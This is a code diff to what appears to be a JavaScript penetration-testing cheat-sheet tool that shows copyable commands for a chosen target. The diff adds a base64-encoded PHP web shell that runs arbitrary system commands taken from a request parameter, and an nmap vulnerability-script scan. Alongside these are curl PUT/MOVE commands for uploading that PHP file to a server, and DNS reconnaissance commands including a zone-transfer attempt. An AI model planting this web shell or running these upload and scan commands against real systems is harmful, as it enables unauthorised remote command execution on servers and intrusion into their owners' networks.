@@ -52,7 +52,7 @@ $(function () {
   storageInfo = JSON.parse(window.sessionStorage.getItem(STORAGE_KEY));
   const webURL = (storageInfo && storageInfo.URL) || 'http://10.0.0.1';
   const webFilename = (storageInfo && storageInfo.FILENAME) || 'webshell';
-  const web = new Web('#mytoolWeb', ['#webList'], {
+  const web = new Web('#mytoolWeb', ['#webList', '#webShellList'], {
     'URL': '#webInputURL',
     'FILENAME': '#webInputFILENAME',
     'SUBMIT': '#webInputSubmit',
@@ -72,6 +72,18 @@ $(function () {
   passcrack.STORAGE_KEY = STORAGE_KEY;
   passcrack.setup(passcrackFilename);
   passcrack.draw(passcrackFilename);
+
+  // --- Setup OSINT list ---
+  STORAGE_KEY = 'OSINT_ENV';
+  storageInfo = JSON.parse(window.sessionStorage.getItem(STORAGE_KEY));
+  const osintRhost = (storageInfo && storageInfo.RHOST) || 'example.com';
+  const osint = new Osint('#mytoolOsint', ['#osintDnsList'], {
+    'RHOST': '#osintInputRHOST',
+    'SUBMIT': '#osintInputSubmit',
+  })
+  osint.STORAGE_KEY = STORAGE_KEY;
+  osint.setup(osintRhost);
+  osint.draw(osintRhost);
 
 
   // URLのハッシュ(#以降の文字列)で初期表示ページの切り替え
@@ -378,6 +390,7 @@ class Recon extends MyTool {
       {'title': 'nmap', 'cmd': 'nmap -T4 -A -v {0}'},
       {'title': 'nmap', 'cmd': 'nmap -sC -sV -O -n -o nmapscan.txt {0}'},
       {'title': 'nmap', 'cmd': 'nmap -sC -sV -p{1} "{0}" -o nmapscan.txt'},
+      {'title': 'vuln', 'cmd': 'nmap -Pn --script vuln {0}'},
     ];
 
     this.targetContents['LDAP'] = [
@@ -423,13 +436,22 @@ class Web extends MyTool {
       {'title': '1. PUT txt file', 'cmd': `curl -v -X PUT '{0}/{1}.txt' --data-binary @{1}.php`},
       {'title': '2. MOVE from txt to php', 'cmd': `curl -v -X MOVE '{0}/{1}.txt' --header 'Destination: {0}/{1}.php'`},
     ];
+
+    this.targetContents['2'] = [
+      {'title': 'WebShell PHP', 'base64': 'Jmx0OyZxdWVzdDtwaHAgaWYmbHBhcjtpc3NldCZscGFyOyZkb2xsYXI7Jmxvd2JhcjtSRVFVRVNUJmxzcWI7JmFwb3M7Y21kJmFwb3M7JnJzcWI7JnJwYXI7JnJwYXI7JmxjdWI7IGVjaG8gJnF1b3Q7Jmx0O3ByZSZndDsmcXVvdDsmc2VtaTsgJmRvbGxhcjtjbWQgJmVxdWFsczsgJmxwYXI7JmRvbGxhcjsmbG93YmFyO1JFUVVFU1QmbHNxYjsmYXBvcztjbWQmYXBvczsmcnNxYjsmcnBhcjsmc2VtaTsgc3lzdGVtJmxwYXI7JmRvbGxhcjtjbWQmcnBhcjsmc2VtaTsgZWNobyAmcXVvdDsmbHQ7JnNvbDtwcmUmZ3Q7JnF1b3Q7JnNlbWk7IGRpZSZzZW1pOyAmcmN1YjsgJnF1ZXN0OyZndDs='},
+    ]
   }
 
   drawList(index, targetContent, url, filename) {
     for (let i = 0; i < targetContent.length; i++) {
       const content = targetContent[i];
       let title = content.title;
-      let cmd = content.cmd;
+      let cmd = "";
+      if (content.base64) {
+        cmd = atob(content.base64);
+      } else {
+        cmd = content.cmd;
+      }
       cmd = cmd.replaceAll('{0}', `<span class="bg-warning">${htmlEscape(url)}</span>`);
       cmd = cmd.replaceAll('{1}', `<span class="bg-warning">${htmlEscape(filename)}</span>`);
       // Template
@@ -479,6 +501,48 @@ class PassCrack extends MyTool {
           <div class="fw-bold">${title}</div>
           <code class="copy_target">${cmd}</code>
           ${(memo === "") ? "": `<p class="ms-3 mt-2">${memo}</p>`}
+        </div>
+        <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy to clipboard">Copy</button>
+      </li>
+      `);
+    }
+  }
+}
+
+// ---- OSINT ------------------------------------------------------------------
+class Osint extends MyTool {
+  constructor(...args) {
+    super(...args);
+
+    this.targetContents['1.DNS'] = [
+      {'title': 'nslookup - SPF', 'cmd': 'nslookup -type=SPF {0}'},
+      {'title': 'nslookup - DMARC', 'cmd': 'nslookup -type=txt _dmarc.{0}'},
+      {'title': 'dig - A (IP Version 4 Address records)', 'cmd': 'dig A {0}'},
+      {'title': 'dig - AAAA (IP Version 6 Address records)', 'cmd': 'dig AAAA {0}'},
+      {'title': 'dig - CNAME (Canonical Name records)', 'cmd': 'dig CNAME {0}'},
+      {'title': 'dig - HINFO (Host Information records)', 'cmd': 'dig HINFO {0}'},
+      {'title': 'dig - ISDN (Integrated Services Digital Network records)', 'cmd': 'dig ISDN {0}'},
+      {'title': 'dig - MX (Mail exchanger record)', 'cmd': 'dig MX {0}'},
+      {'title': 'dig - NS (Name Server records)', 'cmd': 'dig NS {0}'},
+      {'title': 'dig - PTR (Reverse-lookup Pointer records)', 'cmd': 'dig PTR {0}'},
+      {'title': 'dig - SOA (Start of Authority records)', 'cmd': 'dig SOA {0}'},
+      {'title': 'dig - TXT (Text records)', 'cmd': 'dig TXT {0}'},
+      {'title': 'Zone Transfer', 'cmd': 'dig axfr {0} @IPADDR'},
+    ];
+  }
+
+  drawList(index, targetContent, rhost) {
+    for (let i = 0; i < targetContent.length; i++) {
+      const content = targetContent[i];
+      let title = content.title;
+      let cmd = content.cmd;
+      cmd = cmd.replace('{0}', `<span class="bg-warning">${htmlEscape(rhost)}</span>`);
+      // Template
+      $(this.targetCSSSelectors[index]).append(`
+      <li class="list-group-item d-flex justify-content-between align-items-start copy_article">
+        <div class="ms-2 me-auto" style="width: 80%">
+          <div class="fw-bold">${title}</div>
+          <code class="copy_target">${cmd}</code>
         </div>
         <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy to clipboard">Copy</button>
       </li>
